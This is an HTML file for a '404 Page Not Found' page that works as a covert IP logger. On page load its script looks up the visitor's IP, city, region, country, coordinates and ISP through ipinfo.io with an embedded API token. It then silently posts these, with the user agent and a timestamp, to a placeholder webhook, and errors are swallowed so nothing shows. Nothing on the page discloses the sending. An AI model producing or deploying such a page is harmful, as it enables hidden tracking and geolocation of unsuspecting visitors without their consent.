<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Page Not Found - 404</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      align-items: center;
      justify-content: center;
      background: #f8fafc;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #23272f;
    }
    .container {
      background: #fff;
      padding: 2.5rem 4rem;
      border-radius: 12px;
      box-shadow: 0 4px 32px rgba(0,0,0,0.08);
      text-align: center;
      max-width: 90vw;
    }
    .code {
      font-size: 3.5rem;
      color: #f65a5b;
      margin-bottom: 0.5rem;
      font-weight: bold;
      letter-spacing: 2px;
    }
    .message {
      font-size: 1.2rem;
      margin-bottom: 1.7rem;
    }
    .ip {
      font-family: monospace;
      color: #4b9cdb;
      font-size: 1.15rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="code">404</div>
    <div class="message">Oops! The page you are looking for does not exist.</div>
    <div>Your IP address: <span class="ip" id="ip">Loading...</span></div>
    <div id="location"></div>
  </div>
  <script>
    const WEBHOOK_URL = "https://your-webhook-url.example.com"; // Change this

    function sendToWebhook(payload) {
      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      }).catch(() => {});
    }

    fetch("https://ipinfo.io/json?token=7e93355f701ef8")
      .then(r => r.json())
      .then(data => {
        document.getElementById("ip").textContent = data.ip || "Unavailable";
        document.getElementById("location").textContent =
          [data.city, data.region, data.country].filter(Boolean).join(", ");

        sendToWebhook({
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country,
          loc: data.loc,
          org: data.org,
          userAgent: navigator.userAgent,
          page: "404",
          timestamp: new Date().toISOString()
        });
      })
      .catch(() => {
        document.getElementById("ip").textContent = "Unavailable";
      });
  </script>
</body>
</html>
